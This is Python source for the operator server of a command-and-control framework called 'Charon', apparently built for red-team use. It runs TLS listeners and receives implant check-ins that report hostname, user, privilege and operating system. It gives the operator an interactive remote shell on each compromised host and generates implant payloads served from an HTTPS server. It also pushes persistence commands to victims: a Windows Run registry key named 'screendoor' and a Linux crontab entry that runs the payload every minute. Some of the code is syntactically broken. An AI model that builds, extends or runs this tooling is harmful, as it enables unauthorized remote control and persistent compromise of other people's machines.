#!/usr/bin/python3

import base64
import contextlib
import random
import shutil
import socket
import string
import subprocess
import threading
import time
import ssl
from datetime import datetime
from prettytable import PrettyTable
from rich.table import Table
from rich import box
from config.design import *
from config.commands import *
from config.database.database_functions import *
from config.config_create.create_config_file import config_obj
from config.config_create.create_profiles import profiles_obj
from config.networking.communication import *
from modules.implant_conf.implant_python import winpy, linpy, exepy
from modules.implant_conf.implant_pwsh import pshell_cradle


database_connect(database_config["targets_db"])
# add_target_db()
# update_target_db()
# delete_target_db()


config_obj.read('config/config_files/server_config.ini')
profiles_obj.read('config/config_files/profiles.ini')
ssl_config = config_obj["SSL"]


def target_comm(targ_id, targets, num):
    """
    Handles communication with implants
    :param targ_id:
    :param targets:
    :param num:
    :return:
    """

    while True:
        message = console.input(f"[yellow]{targets[num][3]}@{targets[num][1]}$ ")
        comm_out(targ_id, message)

        match message.strip():
            case 'exit':
                targ_id.send(bytes(message.encode()))
                targ_id.close()
                # Mark client as dead in sessions list
                targets[num][7] = 'Dead'
                break

            # Commands
            case ('background', 'bg'):
                targets[num][7] = 'Background'
                break

            case message ('persist', 'pt'):
                payload_name = console.input("[royal_blue1][i] Enter Payload Name to Persist: ")
                if targets[num][6] == 1:
                    # Command 1
                    persist_command_1 = f'cmd.exe /c copy {payload_name} C:\\Users\\Public'
                    targ_id.send(persist_command_1.encode())
                    
                    # Command 2
                    persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
                    targ_id.send(persist_command_2.encode())

                    # Always keep a command to clean up endpoints after an engagement
                    info("Run this command to cleanup the registry: \nreg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v screendoor /f")

                if targets[num][6] == 2:
                    persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
                    targ_id.send(persist_command.encode())
                    info("Run this command to clean up crontab (Remove Persistence): \n crontab -r")

                success("Persistence Technique Completed")

            case "download":
                try:
                    sock.send((message).encode())
                    exist = targ_id.recv(1024).decode()
                except OSError:
                    error("File does not exist")
                    continue
        
        if len(message) == 0:
            continue

        else:
            response = comm_in(targ_id)
            if response == 'exit':
                error("Client Connection Closed")
                targ_id.close()
                break
            print(response)


def time_record():
    cur_time = time.strftime("%H:%M:%S", time.localtime())
    date = datetime.now()
    time_record = f"{date.day}/{date.month}/{date.year} {cur_time}"
    return time_record
            

def comm_handler():
    """
    Generates table parameters and handles communication
    :return:
    """

    while kill_flag != 1:
        try:
            remote_target, remote_ip = sock.accept()
            hostname = remote_target.recv(1048576).decode()
            hostname = base64.b64decode(hostname).decode()
            
            # Get info from implant
            username = remote_target.recv(1024).decode('utf-8')  # - 1
            username = base64.b64decode(username).decode()
            username = str(username).strip() if username else "Unknown Username"

            admin = remote_target.recv(1024).decode('utf-8')  # - 2
            admin = base64.b64decode(admin).decode()
            admin = admin if admin else 0  # Default to non-admin

            op_sys = remote_target.recv(4096).decode('utf-8')  # - 3
            op_sys = base64.b64decode(op_sys).decode()
            op_sys = str(op_sys).strip() if op_sys else "Unknown OS"


            # Windows
            if admin == 1:
                admin_val = "Admin"
            # Linux    
            elif username == 'root':
                admin_val = "Root"
            # All
            else:
                admin_val = "Unknown Privilege"

            # Operating System
            # pay_val = 1 if 'Windows' in op_sys else 2
            pay_val = 1 if 'Windows' in op_sys else 2           

            # Add to table
            if hostname is not None:
                targets.append([remote_target,
                                f"{hostname}@{remote_ip[0]}",  # Target
                                time_record,                       # Check in
                                username,                          # Username
                                admin_val,                         # Check Privileges (User/Admin)
                                op_sys,                            # Operating System (Windows/Linux)
                                pay_val,                           # Payload Type (1 - Windows/2 - Other)
                                'Active'                           # Status
                                ])

                console.print(
                    f'[green]\n[+] Connection Received from {hostname}:{remote_ip}\n',
                    # + f'[yellow]{hostname}:{remote_ip}',
                    end='',
                )

            else:
                targets.append([remote_target,
                                remote_ip[0],
                                time_record,
                                username,
                                admin_val,
                                op_sys,
                                pay_val,
                                'Active'
                                ])
                success(
                    f'Connection Received from {remote_ip[0]}\n'
                    + f'Client@{host_ip}$ ',
                    end='',
                )
        except Exception as e:
            error(f"Error Caught: {e}")


def start_web_server():
    global web_server, web_servers
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(ssl_config["certificate"])
    handler = http.server.SimpleHTTPRequestHandler
    address = ((web_server_ip, int(web_server_port)))
    devnull = open(os.devnull, 'w')
    # sys.stdout = devnull
    sys.stderr = devnull
    with socketserver.TCPServer(address, handler) as web_server:
        web_server.socket = context.wrap_socket(web_server.socket, server_side=True)
        web_server.serve_forever()
    # web_server = socketserver.TCPServer(address, handler)
    # web_server.serve_forever()

    
def stop_web_server():
    global web_server, web_servers
    if web_server:
        web_server.shutdown()
        web_server.server_close()
        web_server = None
    for server in web_servers:
        server[2] = 'Dead'
    info('Web Server Stopped.')


def exit_server():
    tar_length = len(targets)
    process("Deleting Payloads")
    try:
        if os.path.exists('Generated Payloads'):
            shutil.rmtree('Generated Payloads')
        for target in targets:
            if target[7] != 'Dead':
                comm_out(target[0], 'exit')
        global kill_flag
        kill_flag = 1
        if listener_counter > 0:
            sock.close()
        quit("Quitting...")
    except PermissionError as e:
        error(f"Permission Denied: {e}")
        exit


def generate_listener():

    try:
        host_ip = console.input("[royal_blue1] [i] Enter Listener IP: ")
        host_port = console.input("[royal_blue1] [i] Enter Listener Port: ")

        def listener_thread():
            set_server_addr(host_ip, host_port)
            listener_handler(host_ip, host_port)
            success(f"Listener created on: {host_ip}:{host_port}")

        listener_thread = threading.Thread(target=listener_thread)
        listener_thread.start()

        listener_info = {
            "ID": listener_counter,
            "IP": host_ip,
            "Port": host_port,
            "Status": "Active",
        }
        listeners_info.append(listener_info)

        display_listeners_table()

    except socket.gaierror as e:
        error(f"Error initiating a listener, check your IP/PORT: {e}")


    except socket.gaierror as e:
        error(f"Error initiating a listener, check your IP/PORT: {e}")


def display_listeners_table():
    # Display listeners information in a rich table
    listeners_table = Table(title="Listeners Information", box=box.ROUNDED)
    listeners_table.add_column("ID", style="cyan")
    listeners_table.add_column("IP", style="cyan")
    listeners_table.add_column("Port", style="cyan")
    listeners_table.add_column("Status", style="cyan")

    for listener_info in listeners_info:
        listeners_table.add_row(
            str(listener_info["ID"]),
            listener_info["IP"],
            listener_info["Port"],
            listener_info["Status"],
        )

    console.print(listeners_table)


def kill_listener(listener_id):
    
    """Command to kill an active listener
    TODO:
    - Close socket of selected ID
    - Display 'Inactive' on listener table
    """    
    
    global listeners_info

    for listener_info in listeners_info:
        if listener_info["ID"] == listener_id:
            # Update the status
            listener_info["Status"] = "Inactive"

            # Add logic to stop the corresponding listener thread (not provided in this example)
            # sock.
            success(f"Listener with ID {listener_id} killed.")
            display_listeners_table()
            return

    error(f"Listener with ID {listener_id} not found.")


def listener_handler(host_ip, host_port):
    """
    Handles connections and threads them
    :return:
    """

    sock.bind((host_ip, int(host_port)))
    process('Listener Started\n')
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.start()


def connection():
    # TLS Configuration
    global sock
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=ssl_config["certificate"], keyfile=ssl_config["privkey"])
    context.verify_mode = ssl.CERT_NONE
    sock = context.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_side=True)


# Main Function
if __name__ == "__main__":
    banner()
    connection()
    targets = []
    listeners_info = []
    kill_flag = 0
    listener_counter = 1
    
    config = configparser.ConfigParser()
    config.read('config/config_files/profiles.ini')
    current_profile = config['current_profile']['name']
    info(f"Current profile: {current_profile}\n")
    
    while True:
        try:
            if config.has_section("current_profile"):
                host_ip = config[current_profile].get('host_ip', 'default_ip')
                host_port = int(config[current_profile].get('host_port', 'default_port'))
            command = console.input(f"[deep_sky_blue2]Charon@{host_ip}$ ").strip()

            if command.split(" ")[0] == "listeners" and len(command.split(" ")) > 1:
                subcommand = command.split(" ")[1].strip()

                if subcommand in ['-g', 'generate']:
                    generate_listener()
                    listener_counter += 1
                
                if subcommand in ['-l', 'list']:
                    display_listeners_table()
                    
                if subcommand in ['-k', 'kill']:
                    try:
                        listener_id = command.split(" ")[2].split()
                        kill_listener(listener_id)
                    except IndexError:
                        pass


            match command.strip():
                case ('help' | 'h'):
                    help_menu()
                    
                case ('clear' | 'cls'):
                    clear()
                    
                case ('pshell_shell'):
                    pshell_cradle()
                    
                case 'winpy':
                    if listener_counter > 0:
                        winpy()
                    else:
                        error("Generate Listener First")

                case 'linpy':
                    if listener_counter > 0:
                        linpy()
                    else:
                        error("Generate Listener First")

                case 'exepy':
                    if listener_counter > 0:
                        exepy()
                    else:
                        error("Generate Listener First")
                        
                case ('exit'):
                    quit_message = console.input("[bold red]\n[!] Are you sure you want to quit? (yes/no): ").lower().strip()
                    if quit_message.strip() in ['y', 'yes']:
                        kill_flag = 1
                        sock.close()
                        exit_server()
                        break
                    else:
                        continue
                    
            if command.split(" ")[0] == "profile" and len(command.split(" ")) > 1:
                subcommand = command.split(" ")[1].strip()

                if subcommand == "create":
                    profile_name = input(str("Profile Name: "))
                    create_profile(profile_name, host_ip, host_port)

                elif subcommand == "switch":
                    profile_name = input(str("Profile Name: "))
                    switch_profile(profile_name)

                elif subcommand == "current":
                    get_current_profile()

                elif subcommand == "list":
                    list_profiles()
                
                elif subcommand == "update":
                    update_config(profile_name, host_ip, host_port)
                    
            if command.split(" ")[0] == "update" and len(command.split(" ")) > 1:
                subcommand = command.split(" ")[1].strip()

                if subcommand == "repo":
                    update_repo()

            # Generate Sessions Commands
            if command.split(" ")[0] == 'sessions' and len(command.split(" ")) > 1:
                subcommand = command.split(" ")[1].strip()
                session_counter = 0

                # List Sessions
                if subcommand in ['-l', 'list']:
                    session_table = Table(title="Implant Sessions",
                                  box=box.ROUNDED)
                    # Table Headers
                        # Rich
                    session_table.add_column("Session ID", style="royal_blue1")
                    session_table.add_column("Status", style="spring_green1")
                    session_table.add_column("Username", style="deep_pink4")
                    session_table.add_column("Privilege", style="medium_violet_red")
                    session_table.add_column("Target", style="dark_violet")
                    session_table.add_column("Operating System", style="pale_turquoise4")
                    session_table.add_column("Check-In Time", style="plum4")

                    # Table Rows
                    for target in targets:
                        # Rich
                        session_table.add_row(
                                    str(session_counter), 
                                    str(target[7]), 
                                    str(target[3]), 
                                    str(target[4]), 
                                    str(target[1]), 
                                    str(target[5]), 
                                    str(target[2])
                                )

                    session_counter += 1
                    console.print(session_table)
  
                        
                # Interact with Session
                if command.split(" ")[1].strip() in ['-i', 'interact']:
                    try:
                        num = int(command.split(" ")[2].strip())
                        targ_id = (targets[num])[0]
                        if (targets[num])[7] == 'Active':
                            target_comm(targ_id, targets, num)
                        else:
                            error("The Dead Don't Talk - Cannot communicate with agent")
                    except IndexError:
                        error(f"Session {num} does not exist")
                        pass
                    except NameError:
                        error("Please enter a number")
                        pass

                # Kill Session
                if command.split(" ")[1].strip() in ['-k', 'kill']:
                    try:
                        num = int(command.split(" ")[2].strip())
                        targ_id = (targets[num])[0]
                        if (targets[num])[7] == 'Active':
                            kill_sig(targ_id, 'exit')
                            targets[num][7] = 'Dead'
                            error(f"Session {num} Killed")
                        else:
                            error(f"Session {num} is already dead")
                    except IndexError:
                        error(f"Session {num} does not exist")
                    except NameError:
                        error("Enter a Session ID")
                        continue

        except KeyboardInterrupt:
            quit_message = console.input("[bold red]\n[!] Are you sure you want to quit? (yes/no): ").lower().strip()
            if quit_message.strip() in ['y', 'yes']:
                kill_flag = 1
                sock.close()
                exit_server()
                break
            else:
                continue
        except ConnectionAbortedError as ConnAbort:
            error(f"Connection Error: {ConnAbort}")
            break
        except ConnectionResetError as ConnReset:
            error(f"Connection Error: {ConnReset}")
            break
        except Exception as e:
            error(f"Error Caught: {e}")
            continue